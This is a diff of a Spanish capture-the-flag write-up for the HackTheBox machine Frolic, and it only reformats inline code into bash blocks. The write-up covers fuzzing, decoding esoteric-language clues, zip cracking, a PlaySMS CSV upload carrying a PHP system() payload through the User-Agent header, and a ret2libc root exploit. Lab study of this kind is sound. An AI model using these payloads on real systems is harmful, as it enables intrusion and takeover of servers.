@@ -59,17 +59,45 @@ smbclient -L 10.10.10.111 -N
 smbmap -H 10.10.10.111 
 ```
 
-Vemos un recurso `Printer Driver` y `IPC` pero no tenemos accesso.
+Vemos un recurso 
+```bash
+ Printer Driver 
+```
+ y 
+```bash
+ IPC 
+```
+ pero no tenemos accesso.
 
 ### Analyzando la web {-}
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.111:1880`. Vemos un panel de inicio de session **Node-Red**. Intentamos login por defectos como `admin:admin` pero no va.
+Si entramos en la url 
+```bash
+ http://10.10.10.111:1880 
+```
+. Vemos un panel de inicio de session **Node-Red**. Intentamos login por defectos como 
+```bash
+ admin:admin 
+```
+ pero no va.
 Miramos por internet si existen credenciales por defecto con **Node-Red** pero por el momento no encontramos nada.
 
-Checkeamos la url `http://10.10.10.111:9999` y vemos la pagina por defecto de **Nginx**. En esta pagina vemos una url `http://forlic.htb:1880`. Nos parece turbio porque
-la url es **forlic** y no **frolic**, pero ya nos hace pensar que se puede aplicar virtual hosting. Lo añadimos al `/etc/hosts` y probamos pero no vemos ninguna diferencia.
+Checkeamos la url 
+```bash
+ http://10.10.10.111:9999 
+```
+ y vemos la pagina por defecto de **Nginx**. En esta pagina vemos una url 
+```bash
+ http://forlic.htb:1880 
+```
+. Nos parece turbio porque
+la url es **forlic** y no **frolic**, pero ya nos hace pensar que se puede aplicar virtual hosting. Lo añadimos al 
+```bash
+ /etc/hosts 
+```
+ y probamos pero no vemos ninguna diferencia.
 
 #### Aplicando Fuzzing {-}
 
@@ -84,9 +112,21 @@ Aqui encontramos routas como
 - dev
 - backup
 
-Si vamos a la url `http://10.10.10.111:9999/admin` vemos un panel de inicio de session que nos dice *c'mon i m hackable*.
+Si vamos a la url 
+```bash
+ http://10.10.10.111:9999/admin 
+```
+ vemos un panel de inicio de session que nos dice *c'mon i m hackable*.
 
-Intentamos nuevamente `admin:admin` y nos sale un mensaje **you have 2 more left attempts**, controlamos si esto es general o solo para el usuario admin `test:test`
+Intentamos nuevamente 
+```bash
+ admin:admin 
+```
+ y nos sale un mensaje **you have 2 more left attempts**, controlamos si esto es general o solo para el usuario admin 
+```bash
+ test:test 
+```
+
 y vemos que es general. 
 
 
@@ -102,25 +142,53 @@ y vemos que es general.
 
 ### Credenciales en ficheros javascript y lenguaje esoterico {-}
 
-En este caso no tocamos mas porque no queremos ser bloqueados. Si miramos el codigo fuente vemos que hay un fichero `login.js` que contiene las
+En este caso no tocamos mas porque no queremos ser bloqueados. Si miramos el codigo fuente vemos que hay un fichero 
+```bash
+ login.js 
+```
+ que contiene las
 credenciales.
 
-Entramos las credenciales en la web `admin:superduperlooperpassword_lol` y conseguimos connectarnos y entramos en una pagina que contiene caracteres raros. Esto en concreto
+Entramos las credenciales en la web 
+```bash
+ admin:superduperlooperpassword_lol 
+```
+ y conseguimos connectarnos y entramos en una pagina que contiene caracteres raros. Esto en concreto
 se llama **Lenguaje esoterico**. Pero primero tenemos que buscar que lenguaje esoterico es en concreto.
 
-Si buscamos en la web por `esoteric languages` encontramos una lista de 10 lenguajes esotericos en [esolangs](https://esolangs.org/wiki/Esoteric_programming_language). Uno de ellos nos 
+Si buscamos en la web por 
+```bash
+ esoteric languages 
+```
+ encontramos una lista de 10 lenguajes esotericos en [esolangs](https://esolangs.org/wiki/Esoteric_programming_language). Uno de ellos nos 
 llama la atencion porque es bastante parecido. Este seria el [Ook!](https://esolangs.org/wiki/Ook!). La diferencia es que cada **.** **?** **!** contiene un **Ook** delante.
 
-Copiamos los caracteres en un fichero `data` y lo tratamos para que se paresca al `Ook!`
+Copiamos los caracteres en un fichero 
+```bash
+ data 
+```
+ y lo tratamos para que se paresca al 
+```bash
+ Ook! 
+```
+
 
 ```bash
 cat data | sed 's/\./Ook\./g' | sed 's/\?/Ook\?/g' | sed 's/\!/Ook\!/g' | xclip -sel clip
 ```
 
-Copiamos el mensaje en la web [dcode.fr](https://dcode.fr). Buscamos el code `Ook!` y colamos el mensaje y decodificando nos da el mensaje **Nothing here check
+Copiamos el mensaje en la web [dcode.fr](https://dcode.fr). Buscamos el code 
+```bash
+ Ook! 
+```
+ y colamos el mensaje y decodificando nos da el mensaje **Nothing here check
 **/asdiSIAJJ0QWE9JAS** que parece ser una routa.
 
-Si vamos a la url `http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS` vemos una nueva pagina con un nuevo mensaje que parece se **base64**.
+Si vamos a la url 
+```bash
+ http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS 
+```
+ vemos una nueva pagina con un nuevo mensaje que parece se **base64**.
 
 ```bash
 curl -s -X GET "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" 
@@ -133,7 +201,15 @@ file data
 mv data data.zip
 ```
 
-Aqui vemos que es un comprimido `.zip` y si le damos a `unzip data.zip` vemos que esta protegida por contraseña.
+Aqui vemos que es un comprimido 
+```bash
+ .zip 
+```
+ y si le damos a 
+```bash
+ unzip data.zip 
+```
+ vemos que esta protegida por contraseña.
 
 
 ### Crackeando con fcrackzip {-}
@@ -142,15 +218,31 @@ Aqui vemos que es un comprimido `.zip` y si le damos a `unzip data.zip` vemos qu
 fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt data.zip
 ```
 
-Aqui vemos que la contraseña es `password`.
+Aqui vemos que la contraseña es 
+```bash
+ password 
+```
+.
 
-Volmemos a descomprimir el fichero poniendole la contraseña y vemos un fichero `index.php`
+Volmemos a descomprimir el fichero poniendole la contraseña y vemos un fichero 
+```bash
+ index.php 
+```
+
 
 ```bash
 cat index.php
 ```
 
-vemos que nuevamente esta encryptada con caracteres del `a-f` y del `0-9` que seria Hexadecimal.
+vemos que nuevamente esta encryptada con caracteres del 
+```bash
+ a-f 
+```
+ y del 
+```bash
+ 0-9 
+```
+ que seria Hexadecimal.
 
 ```bash
 cat index.php | xxd -ps -r
@@ -169,15 +261,47 @@ cat data
 Estamos nuevame frente a un lenguaje esoterico que parece se un **brainfuck**. Lo copiamos en la clipboard y lo decodificamos nuevamente en la web. En este
 caso tiraremos de la web [tutorialspoint](https://www.tutorialspoint.com/execute_brainfk_online.php).
 
-Pegamos el codigo y le damos a **Execute** y vemos el mensaje `idkwhatispass` que nos hace pensar en una contraseña. Intentamos ver si es la contraseña del usuario
-admin del panel de authenticacion `Node-Red` pero no funcciona.
+Pegamos el codigo y le damos a **Execute** y vemos el mensaje 
+```bash
+ idkwhatispass 
+```
+ que nos hace pensar en una contraseña. Intentamos ver si es la contraseña del usuario
+admin del panel de authenticacion 
+```bash
+ Node-Red 
+```
+ pero no funcciona.
 
 ### Continuando analyzando las routas {-}
 
-Si vamos a la url `http://10.10.10.111:9999/test` vemos un **php_info**. Lo primero aqui es siempre mirar las **disabled_functions**. No parece ser desabilitadas las
-funcciones `exec()`, `shell_exec()` o `system()`.
+Si vamos a la url 
+```bash
+ http://10.10.10.111:9999/test 
+```
+ vemos un **php_info**. Lo primero aqui es siempre mirar las **disabled_functions**. No parece ser desabilitadas las
+funcciones 
+```bash
+ exec() 
+```
+, 
+```bash
+ shell_exec() 
+```
+ o 
+```bash
+ system() 
+```
+.
 
-Vamos a la url `http://10.10.10.111:9999/dev` y vemos un **403 Forbidden**. Como esta Forbidden intentamos ver si a routas validas bajo la routa `/dev` con **WFUZZ**.
+Vamos a la url 
+```bash
+ http://10.10.10.111:9999/dev 
+```
+ y vemos un **403 Forbidden**. Como esta Forbidden intentamos ver si a routas validas bajo la routa 
+```bash
+ /dev 
+```
+ con **WFUZZ**.
 
 ```bash
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.111:9999/dev/FUZZ
@@ -187,9 +311,25 @@ y encontramos otras routas
 - test
 - backup
 
- Si vamos a la url `http://10.10.10.111:9999/dev/test` nos descarga un fichero. y a la routa `http://10.10.10.111:9999/dev/backup` hay una nueva routa `/playsms`.
+ Si vamos a la url 
+```bash
+ http://10.10.10.111:9999/dev/test 
+```
+ nos descarga un fichero. y a la routa 
+```bash
+ http://10.10.10.111:9999/dev/backup 
+```
+ hay una nueva routa 
+```bash
+ /playsms 
+```
+.
 
-Miramos lo que hay en la url `http://10.10.10.111.9999/playsms` y vemos un panel de inicio de session **playsms**. Miramos si hay vulnerabilidades asociadas con searchsploit.
+Miramos lo que hay en la url 
+```bash
+ http://10.10.10.111.9999/playsms 
+```
+ y vemos un panel de inicio de session **playsms**. Miramos si hay vulnerabilidades asociadas con searchsploit.
 
 ```bash
 searchsploit playsms
@@ -197,7 +337,15 @@ searchsploit playsms
 
 Y vemos que hay exploits con Template Injection y Remote code execution.
 
-Intentamos loggearnos con `admin:admin`, no va y intentamos el password que hemos encontrado antes. `admin:idkwhatispass` y en este caso funcciona.
+Intentamos loggearnos con 
+```bash
+ admin:admin 
+```
+, no va y intentamos el password que hemos encontrado antes. 
+```bash
+ admin:idkwhatispass 
+```
+ y en este caso funcciona.
 
 ### Explotando PlaySMS {-}
 
@@ -208,7 +356,11 @@ searchsploit playsms | grep -v -i metasploit | grep -i "remote code execution"
 searchsploit -x 42044
 ```
 
-Aqui el exploit nos dice que una vez loggeado con cualquier usuario, tenemos que ir a la url `http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list`,
+Aqui el exploit nos dice que una vez loggeado con cualquier usuario, tenemos que ir a la url 
+```bash
+ http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list 
+```
+,
 y uploadear un fichero malicioso backdoor.csv
 
 ```csv
@@ -216,11 +368,23 @@ Name,Mobile,Email,Groupe code,Tags
 <?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,22,,
 ```
 
-Aqui podemos ver que el exploit usa una cabezera para transmitir el comando que queremos ejecutar con la fuccion php `system()`. Esto quiere decir que tenemos que uzar
+Aqui podemos ver que el exploit usa una cabezera para transmitir el comando que queremos ejecutar con la fuccion php 
+```bash
+ system() 
+```
+. Esto quiere decir que tenemos que uzar
 burpsuite para cambiar el user agent durante el upload.
 
-Lanzamos Burpsuite y interceptamos el envio del fichero backdoor.csv. Cambiamos el User-Agent con `whoami`, Forwardeamos la peticion y en la web podemos ver
-`www-data` en la columna Name.
+Lanzamos Burpsuite y interceptamos el envio del fichero backdoor.csv. Cambiamos el User-Agent con 
+```bash
+ whoami 
+```
+, Forwardeamos la peticion y en la web podemos ver
+
+```bash
+ www-data 
+```
+ en la columna Name.
 
 ## Vuln exploit & Gaining Access {-}
 
@@ -282,7 +446,11 @@ cd ./binary
 ls -la
 ```
 
-Aqui vemos un fichero `rop` que tiene derechos suid como el usuario root. y como se llama rop pensamos directamente a un BufferOverflow
+Aqui vemos un fichero 
+```bash
+ rop 
+```
+ que tiene derechos suid como el usuario root. y como se llama rop pensamos directamente a un BufferOverflow
 
 ```bash
 ./rop
@@ -373,7 +541,11 @@ Como vemos que hay un BOF nos enviamos el binario a nuestra maquina de atacante 
     Y vemos que el $eip vale ahora 0x42424242 que son 4 "B"
 
 Como aqui sabemos que no podemos ejecutar comandos desde la pila porque el NX esta habilitado, la primera cosa que nos pasa por la cabeza seria
-usar la technica `Ret2Libc`. Lo que tenemos que ver para efectuar esta tecnica seria ver si hay que burlar el ASLR en caso de que haya aleatorisacion 
+usar la technica 
+```bash
+ Ret2Libc 
+```
+. Lo que tenemos que ver para efectuar esta tecnica seria ver si hay que burlar el ASLR en caso de que haya aleatorisacion 
 en las direcciones de la memoria.
 
 Esto se controla desde la maquina victima.
@@ -395,10 +567,18 @@ Esto se controla desde la maquina victima.
     2
     ```
 
-    Esta habilitado y lo podemos comprobar dandole multiples vecez al comando `ldd rop` y vemos que la libreria libc.so.6 cambia
+    Esta habilitado y lo podemos comprobar dandole multiples vecez al comando 
+```bash
+ ldd rop 
+```
+ y vemos que la libreria libc.so.6 cambia
     de direccion cada vez.
 
-Ahora que tenemos esto en cuenta miramos como atacamos el BOF con un `Ret2Libc`. La tecnica aqui seria que una vez tomado el control del $eip
+Ahora que tenemos esto en cuenta miramos como atacamos el BOF con un 
+```bash
+ Ret2Libc 
+```
+. La tecnica aqui seria que una vez tomado el control del $eip
 redirigir el programa a la direccion del 
 
 1. system_addr
@@ -408,8 +588,24 @@ redirigir el programa a la direccion del
 ret2libc -> system_addr + exit_addr + bin_sh_addr.
 
 Solo falta conocer las direcciones de estas funcciones. Como la maquina es de architectura 32 bits, podemos intentar colision con las direcciones.
-De que se trata exactamente; En condiciones normales (donde el ASLR no esta activado), sumariamos los diferentes ofsets de las funcciones `system`, 
-`exit` y `/bin/sh` a la direccion de la libreria `libc`. Estas direcciones se encuentran de la manera siguiente.
+De que se trata exactamente; En condiciones normales (donde el ASLR no esta activado), sumariamos los diferentes ofsets de las funcciones 
+```bash
+ system 
+```
+, 
+
+```bash
+ exit 
+```
+ y 
+```bash
+ /bin/sh 
+```
+ a la direccion de la libreria 
+```bash
+ libc 
+```
+. Estas direcciones se encuentran de la manera siguiente.
 
 1. la direccion de libreria libc
 
@@ -435,7 +631,11 @@ De que se trata exactamente; En condiciones normales (donde el ASLR no esta acti
 
     Aqui el *0003ada0* y el *0002e9d0* son los offset que tendriamos que sumar a la direccion de la libreria libc
 
-1. el offset de la cadena `/bin/sh`
+1. el offset de la cadena 
+```bash
+ /bin/sh 
+```
+
 
     ```bash
     strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
@@ -518,4 +718,8 @@ while True:
         sys.exit(0)
 ```
 
-lanzamos el script con `python exploit.py` y esperamos de salir del bucle infinito para ganar la shell como root y leer la flag.
+lanzamos el script con 
+```bash
+ python exploit.py 
+```
+ y esperamos de salir del bucle infinito para ganar la shell como root y leer la flag.
